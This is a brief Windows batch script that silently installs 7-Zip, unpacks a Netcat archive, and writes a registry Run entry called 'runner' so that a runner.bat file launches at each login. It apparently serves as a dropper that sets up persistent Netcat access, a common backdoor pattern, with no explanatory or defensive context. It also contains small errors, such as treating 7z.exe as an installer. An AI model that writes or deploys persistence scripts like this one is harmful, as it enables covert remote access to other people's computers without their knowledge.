@echo off

7z.exe /S /D="C:\Program Files\7-Zip"

REM Unzip the Netcat ZIP file
"C:\Program Files\7-Zip\7z.exe" x netcat-win32-1.11.zip

REM Get the current directory
set currentDirectory=%~dp0

REM Create the registry value
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "runner" /t REG_SZ /d "%currentDirectory%\runner.bat"